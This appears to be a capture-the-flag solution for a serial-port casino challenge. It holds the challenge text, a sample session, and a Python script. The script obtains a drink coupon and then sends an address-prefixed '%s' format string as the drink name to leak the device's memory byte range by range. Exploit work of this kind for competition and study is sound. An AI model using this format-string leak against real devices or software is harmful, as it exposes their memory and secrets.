"""
Welcome to our casino, Riscure Royale! Please enjoy your stay by
playing a game, or drink something at our bar. Reach 1000 credits and
you will be rewarded with a special prize.

We have seen loads of cheaters lately, so we have extra guards walking
around. Do not feel threatened by them, they will only kick out the
people that cheat. Of course, once you earn a lot of money they will
start investigating the matter. Better spend some money at our bar if
this happens.

PS. We all know casinos are scams.

"""
"""
OUTPUT

Welcome to the casino!
Get a currency of 1000 and we give you the secret key.
Occasionally we give away coupons for free drinks.
We have guards walking around, looking for cheaters.
Don't get caught cheating. We will take our currency back.

Current balance: 50
Amount of coupons left: 0

[1] Play
[2] Cheat
[3] Go for a drink at the bar
[4] Give me some free money
[5] Restart
---------------------------------------
[1]
I know the following games:
- [R]oulette
- [S]pin the wheel
------------------
[R]
This game has a change to win the secret key!
Press <Enter> to spin the wheel
You lost 5 credits
------------------
[S]
Pick your number from 1-32.
The ball ended up at number 21
You lost
----------------------------------------
[3]
What would you like to drink?
Our drinks menu:

[1] Beer
[2] Milk
Here is your beer, sir.
We hope you enjoyed your drink!
----------------------------------------
[3]
You have 1 coupons left
What would you like to drink?

> hello world
hello world

Hope you enjoyed your drink!
We hope you enjoyed your drink!
We appreciate your stay here.
To show our gratitude we give you a coupon for a free drink
Current balance: 43
Amount of coupons left: 0

"""
import serial
import struct

decode_format = 'windows-1252'

ser = serial.Serial("/dev/ttyUSB0", 19200, timeout=0.1)
ser.close()

def toByte(msg):
    return str.encode(msg)

def write_ser(msg):
    ser.write(toByte(msg))

def read_until(until):
    out = ''
    while until not in out:
        out += ser.read(1).decode(decode_format)
    # print(out)
    return out

def read_until_end():
    out = ''
    while True:
        r = ser.read(1)
        if not r:
            break
        out += r.decode(decode_format)
    # print(out)
    return out

def get_one_coupon():
    r = ''
    while 'Amount of coupons left: 1' not in r:
        read_until("[5] Restart")
        write_ser('1\r')
        read_until("- [S]pin the wheel")
        write_ser('R\r')
        read_until("Pick your number from 1-32.")
        write_ser('12\r')
        r = read_until("[1] Play")
        if 'Current balance: 1' in r:
            read_until_end()
            write_ser('4\r')
    read_until_end()
    write_ser('3\r')
    read_until_end()

adr = 0x0100

while True:
    ser = serial.Serial("/dev/ttyUSB0", 19200, timeout=0.1)
    info = ''
    get_one_coupon()
    
    adr_raw = struct.pack("<H", adr)
    ser.write(adr_raw + toByte(' |||%s|||\r'))
    info = read_until('[1] Play')
    leak = info.split('|||')[1:2]
    if leak:
        print("{:04x}: {}".format(adr, leak[0]))
        adr += len(leak[0]) + 1
    else:
        adr += 1
    
    ser.close()


